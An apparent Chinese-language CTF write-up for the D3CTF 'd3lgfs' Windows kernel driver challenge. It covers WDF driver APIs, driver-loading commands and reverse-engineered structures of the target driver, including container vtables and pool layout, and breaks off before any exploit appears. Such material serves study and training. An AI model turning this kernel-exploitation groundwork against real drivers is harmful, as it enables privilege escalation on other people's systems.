<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>D3CTF-d3lgfs - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="
WDF PWN
" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="D3CTF-d3lgfs" />
<meta property="og:description" content="
WDF PWN
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/d3ctf-d3lgfs/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-04-30T12:00:00+00:00" />
<meta property="article:modified_time" content="2024-04-30T12:00:00+00:00" />
<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="D3CTF-d3lgfs"/>
<meta name="twitter:description" content="
WDF PWN
"/>
<script src="http://localhost:1313/js/feather.min.js"></script>
	
	
        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>

		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>

		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	

	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">ldrx30</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="http://localhost:1313/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">D3CTF-d3lgfs</h1>
			<div class="meta">Posted on Apr 30, 2024</div>
		</div>
		

		

		<section class="body">
			<blockquote>
<p>WDF PWN</p>
</blockquote>
<p>看起来作者深受 CLFS.sys 迫害</p>
<h2 id="wdf-框架">WDF 框架</h2>
<p>学！<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/">Windows Driver Frameworks</a></p>
<h3 id="deviceentry">DeviceEntry</h3>
<p>依然是入口</p>
<ul>
<li>添加WDF Device的回调函数</li>
<li>创建WDF Driver</li>
</ul>
<h3 id="wdf_xxx">WDF_XXX</h3>
<h4 id="wdfdriver">WDFDRIVER</h4>
<h4 id="wdf_driver_config">WDF_DRIVER_CONFIG</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_WDF_DRIVER_CONFIG</span> {
</span></span><span style="display:flex;"><span>  ULONG                     Size;
</span></span><span style="display:flex;"><span>  PFN_WDF_DRIVER_DEVICE_ADD EvtDriverDeviceAdd;
</span></span><span style="display:flex;"><span>  PFN_WDF_DRIVER_UNLOAD     EvtDriverUnload;
</span></span><span style="display:flex;"><span>  ULONG                     DriverInitFlags;
</span></span><span style="display:flex;"><span>  ULONG                     DriverPoolTag;
</span></span><span style="display:flex;"><span>} WDF_DRIVER_CONFIG, <span style="color:#ff79c6">*</span>PWDF_DRIVER_CONFIG;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">WDF_DRIVER_CONFIG_INIT</span>(
</span></span><span style="display:flex;"><span>  [out]          PWDF_DRIVER_CONFIG        Config,
</span></span><span style="display:flex;"><span>  [in, optional] PFN_WDF_DRIVER_DEVICE_ADD EvtDriverDeviceAdd
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>创建驱动</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">WdfDriverCreate</span>(
</span></span><span style="display:flex;"><span>  [in]            PDRIVER_OBJECT         DriverObject,
</span></span><span style="display:flex;"><span>  [in]            PCUNICODE_STRING       RegistryPath,
</span></span><span style="display:flex;"><span>  [in, optional]  PWDF_OBJECT_ATTRIBUTES DriverAttributes,
</span></span><span style="display:flex;"><span>  [in]            PWDF_DRIVER_CONFIG     DriverConfig,
</span></span><span style="display:flex;"><span>  [out, optional] WDFDRIVER              <span style="color:#ff79c6">*</span>Driver
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><h4 id="wdfdevice">WDFDEVICE</h4>
<p>创建设备</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>WDFDEVICE_INIT <span style="color:#ff79c6">*</span>DeviceInita
</span></span></code></pre></div><p>GUID interface</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">WdfDeviceCreateDeviceInterface</span>(
</span></span><span style="display:flex;"><span>  [in]           WDFDEVICE        Device,
</span></span><span style="display:flex;"><span>  [in]           <span style="color:#ff79c6">const</span> GUID       <span style="color:#ff79c6">*</span>InterfaceClassGUID,
</span></span><span style="display:flex;"><span>  [in, optional] PCUNICODE_STRING ReferenceString
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>KMDF也可以指定symlink，这就与WDM类似了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">WdfDeviceCreateSymbolicLink</span>(
</span></span><span style="display:flex;"><span>  [in] WDFDEVICE        Device,
</span></span><span style="display:flex;"><span>  [in] PCUNICODE_STRING SymbolicLinkName
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><h4 id="io-queue">IO Queue</h4>
<p>初始化</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE</span>(
</span></span><span style="display:flex;"><span>  [out] PWDF_IO_QUEUE_CONFIG       Config,
</span></span><span style="display:flex;"><span>  [in]  WDF_IO_QUEUE_DISPATCH_TYPE DispatchType
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">enum</span> <span style="color:#50fa7b">_WDF_IO_QUEUE_DISPATCH_TYPE</span> {
</span></span><span style="display:flex;"><span>  WdfIoQueueDispatchInvalid <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>,
</span></span><span style="display:flex;"><span>  WdfIoQueueDispatchSequential,
</span></span><span style="display:flex;"><span>  WdfIoQueueDispatchParallel,
</span></span><span style="display:flex;"><span>  WdfIoQueueDispatchManual,
</span></span><span style="display:flex;"><span>  WdfIoQueueDispatchMax
</span></span><span style="display:flex;"><span>} WDF_IO_QUEUE_DISPATCH_TYPE;
</span></span></code></pre></div><p><code>_WDF_IO_QUEUE_CONFIG</code>结构</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_WDF_IO_QUEUE_CONFIG</span> {
</span></span><span style="display:flex;"><span>  ULONG                                       Size;
</span></span><span style="display:flex;"><span>  WDF_IO_QUEUE_DISPATCH_TYPE                  DispatchType;
</span></span><span style="display:flex;"><span>  WDF_TRI_STATE                               PowerManaged;
</span></span><span style="display:flex;"><span>  BOOLEAN                                     AllowZeroLengthRequests;
</span></span><span style="display:flex;"><span>  BOOLEAN                                     DefaultQueue;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_DEFAULT                 EvtIoDefault;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_READ                    EvtIoRead;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_WRITE                   EvtIoWrite;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_DEVICE_CONTROL          EvtIoDeviceControl;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL EvtIoInternalDeviceControl;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_STOP                    EvtIoStop;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_RESUME                  EvtIoResume;
</span></span><span style="display:flex;"><span>  PFN_WDF_IO_QUEUE_IO_CANCELED_ON_QUEUE       EvtIoCanceledOnQueue;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">union</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">struct</span> {
</span></span><span style="display:flex;"><span>      ULONG NumberOfPresentedRequests;
</span></span><span style="display:flex;"><span>    } Parallel;
</span></span><span style="display:flex;"><span>  } Settings;
</span></span><span style="display:flex;"><span>  WDFDRIVER                                   Driver;
</span></span><span style="display:flex;"><span>} WDF_IO_QUEUE_CONFIG, <span style="color:#ff79c6">*</span>PWDF_IO_QUEUE_CONFIG;
</span></span></code></pre></div><h3 id="ring3-与-ring0">Ring3 与 Ring0</h3>
<p>通信依然使用 <code>DeviceIoControl</code>，但是需要使用 <code>GUID</code> 获得驱动的名字</p>
<p>ring0获得ring3 buffer：inbuffer和outbuffer</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">WdfRequestRetrieveInputBuffer</span>(
</span></span><span style="display:flex;"><span>  [in]            WDFREQUEST Request,
</span></span><span style="display:flex;"><span>                  size_t     MinimumRequiredLength,
</span></span><span style="display:flex;"><span>  [out]           PVOID      <span style="color:#ff79c6">*</span>Buffer,
</span></span><span style="display:flex;"><span>  [out, optional] size_t     <span style="color:#ff79c6">*</span>Length
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">WdfRequestRetrieveOutputBuffer</span>(
</span></span><span style="display:flex;"><span>  [in]            WDFREQUEST Request,
</span></span><span style="display:flex;"><span>  [in]            size_t     MinimumRequiredSize,
</span></span><span style="display:flex;"><span>  [out]           PVOID      <span style="color:#ff79c6">*</span>Buffer,
</span></span><span style="display:flex;"><span>  [out, optional] size_t     <span style="color:#ff79c6">*</span>Length
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>ring3通过guid与ring0通信</p>
<ul>
<li>存在symlink与WDM没有区别</li>
</ul>
<p>WDF逆向：<a href="https://ioactive.com/wp-content/uploads/2018/09/Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers.pdf">Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers</a></p>
<p>通信，来自代码仓 - <a href="https://github.com/hustd10/Windows-Driver">hustd10/Windows-Driver</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>DEFINE_GUID(WDF_GUID, xxxx, xx, xx, x,x,x,x,x,x,x,x);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">GetInterfaceDevicePath</span>(GUID<span style="color:#ff79c6">*</span> guid) {
</span></span><span style="display:flex;"><span>	DWORD requiredSize;
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd">int</span> MemberIdx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	HDEVINFO hDeviceInfoset <span style="color:#ff79c6">=</span> SetupDiGetClassDevs(guid, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>, DIGCF_DEVICEINTERFACE <span style="color:#ff79c6">|</span> DIGCF_PRESENT);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (hDeviceInfoset <span style="color:#ff79c6">!=</span> INVALID_HANDLE_VALUE) {
</span></span><span style="display:flex;"><span>		SP_DEVICE_INTERFACE_DATA  DeviceInterfaceData <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>		DeviceInterfaceData.cbSize <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(SP_DEVICE_INTERFACE_DATA);
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">while</span> (SetupDiEnumDeviceInterfaces(hDeviceInfoset, <span style="color:#8be9fd;font-style:italic">NULL</span>, guid, MemberIdx, <span style="color:#ff79c6">&amp;</span>DeviceInterfaceData)) {
</span></span><span style="display:flex;"><span>			MemberIdx<span style="color:#ff79c6">++</span>;
</span></span><span style="display:flex;"><span>			SP_DEVINFO_DATA DeviceInfoData <span style="color:#ff79c6">=</span> { <span style="color:#bd93f9">0</span> };
</span></span><span style="display:flex;"><span>			DeviceInfoData.cbSize <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(SP_DEVINFO_DATA);
</span></span><span style="display:flex;"><span>			SetupDiGetDeviceInterfaceDetail(hDeviceInfoset, <span style="color:#ff79c6">&amp;</span>DeviceInterfaceData, <span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">&amp;</span>requiredSize, <span style="color:#8be9fd;font-style:italic">NULL</span>);
</span></span><span style="display:flex;"><span>			SP_DEVICE_INTERFACE_DETAIL_DATA<span style="color:#ff79c6">*</span> DevIntfDetailData <span style="color:#ff79c6">=</span> HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
</span></span><span style="display:flex;"><span>				requiredSize);
</span></span><span style="display:flex;"><span>			DevIntfDetailData<span style="color:#ff79c6">-&gt;</span>cbSize <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">sizeof</span>(SP_DEVICE_INTERFACE_DETAIL_DATA);
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> (SetupDiGetDeviceInterfaceDetail(hDeviceInfoset, <span style="color:#ff79c6">&amp;</span>DeviceInterfaceData,
</span></span><span style="display:flex;"><span>				DevIntfDetailData, requiredSize, <span style="color:#ff79c6">&amp;</span>requiredSize, <span style="color:#ff79c6">&amp;</span>DeviceInfoData)) {
</span></span><span style="display:flex;"><span>				printf(<span style="color:#f1fa8c">&#34;DevicePath: %S</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, (TCHAR<span style="color:#ff79c6">*</span>)DevIntfDetailData<span style="color:#ff79c6">-&gt;</span>DevicePath);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			HeapFree(GetProcessHeap(), <span style="color:#bd93f9">0</span>, DevIntfDetailData);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		SetupDiDestroyDeviceInfoList(hDeviceInfoset);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>工具</p>
<ul>
<li>WinObjEx</li>
<li>deviceTree</li>
</ul>
<h3 id="加载驱动">加载驱动</h3>
<p>刚开始是和WDM一样，OSRLoader加载，但是后面找不到设备。因此快速入门了一下开发，发现可以使用WDK里面的工具安装</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver#build-the-driver">编写 Hello World Windows 驱动程序 (KMDF)</a></li>
</ul>
<p>需要根据<code>inf</code>文件的内容，使用如下的格式进行安装（直接安装到<code>C:\System32\drivers</code>，开机自启）</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span><span style="color:#6272a4"># root\xxx 需要根据inf文件获得</span>
</span></span><span style="display:flex;"><span>devcon.exe install xxx.inf root\xxx
</span></span></code></pre></div><p>WDM也可以根据命令行进行加载 <code>sc.exe</code></p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/sc-create">sc.exe create | Microsoft Learn</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">sc </span>&lt;server&gt; [command] [service name] &lt;option1&gt; &lt;option2&gt;
</span></span></code></pre></div><h2 id="驱动逆向">驱动逆向</h2>
<p>有符号表，比较友好</p>
<p>获得对应的目录，将pdb放入，就可以带符号调试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-pwsh" data-lang="pwsh"><span style="display:flex;"><span>!sym noisy
</span></span></code></pre></div><p>ceateMyLogFile</p>
<ul>
<li><code>InBuf</code> 指定 filename</li>
<li><code>logfilemem</code>  BIGPOOL 转化为<code>struct myLOG_HEADER</code></li>
<li><code>logfilemem-&gt;logname</code> POOL</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">myLOG_HEADER</span>   <span style="color:#6272a4">// size 0x228
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>{
</span></span><span style="display:flex;"><span>  myCLFS_METADATA_RECORD_HEADER hdrBaseRecord;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> logID;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>logName;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> Containers;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbBusyContainers;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> rgContainers[<span style="color:#bd93f9">128</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbSymbolZone;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> cbSector;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">myCLFS_METADATA_RECORD_HEADER</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> magic;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>add container</p>
<ul>
<li>传递参数 <code>addLogContainer_parm</code>，根据name创建一个 myContainer</li>
<li>cbSymbolZone 偏移，结构体的下一个起始位置</li>
<li>rgContainers 在POOL中的起始位置</li>
<li>Containers 记录个数</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span>  <span style="color:#50fa7b">addLogContainer_parm</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>logFile;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> nameLen;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> containerName[];
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">__cppobj</span> <span style="color:#8be9fd;font-style:italic">myContainer</span> : baseContainer
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">__cppobj</span> baseContainer
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  baseContainer_vtbl <span style="color:#ff79c6">*</span>__vftable <span style="color:#6272a4">/*VFT*/</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">wchar_t</span> <span style="color:#ff79c6">*</span>fileName;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> /*<span style="color:#50fa7b">VFT</span>*/ baseContainer_vtbl
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>write_data)(baseContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>removeContainer)(baseContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>releaseContainer)(baseContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>read_data)(baseContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> (<span style="color:#ff79c6">__fastcall</span> <span style="color:#ff79c6">*</span>read_meta_data)(baseContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// vtable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd">void</span> <span style="color:#ff79c6">__fastcall</span> myContainer<span style="color:#ff79c6">::</span>write_data(myContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  strncpy_0(<span style="color:#ff79c6">this</span><span style="color:#ff79c6">-&gt;</span>data, data, <span style="color:#bd93f9">0x200u</span>i64);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#ff79c6">__fastcall</span> myContainer<span style="color:#ff79c6">::</span>read_data(myContainer <span style="color:#ff79c6">*</span><span style="color:#ff79c6">this</span>, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  strncpy_0(data, <span style="color:#ff79c6">this</span><span style="color:#ff79c6">-&gt;</span>data, <span style="color:#bd93f9">0x200u</span>i64);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// data
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">-&gt;</span>data <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)ExAllocatePool2(<span style="color:#bd93f9">64</span>i64, <span style="color:#bd93f9">0x7228</span>i64, &#39;gl3d&#39;);<span style="color:#6272a4">// 
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// #define POOL_FLAG_NON_PAGED               0x0000000000000040UI64     // Non paged pool NX
</span></span></span></code></pre></div><p>记录下一个块的偏移</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( logFile<span style="color:#ff79c6">-&gt;</span>Containers )
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	thisContainer<span style="color:#ff79c6">-&gt;</span>cbPrevOffset <span style="color:#ff79c6">=</span> logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[logFile<span style="color:#ff79c6">-&gt;</span>Containers <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>)((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[<span style="color:#bd93f9">47</span>] <span style="color:#ff79c6">+</span> logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[logFile<span style="color:#ff79c6">-&gt;</span>Containers <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>]) <span style="color:#ff79c6">=</span> logFile<span style="color:#ff79c6">-&gt;</span>rgContainers[logFile<span style="color:#ff79c6">-&gt;</span>Containers];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>read/writeLogRecord</p>
<ul>
<li>container函数调用</li>
</ul>
<p>这个context</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">__declspec</span>(align(<span style="color:#bd93f9">8</span>)) LogRecord_parm
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>logFile;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> ContainerID;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> data[<span style="color:#bd93f9">512</span>];        <span style="color:#6272a4">// ExAllocatePool 0x200
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// size 0xe0
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">my_CLFS_CONTAINER_CONTEXT</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> cidContainer;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">wchar_t</span> containerName[<span style="color:#bd93f9">100</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">union</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>	  myContainer <span style="color:#ff79c6">*</span>pContainer;               <span style="color:#6272a4">// new myContainer, size 0x18
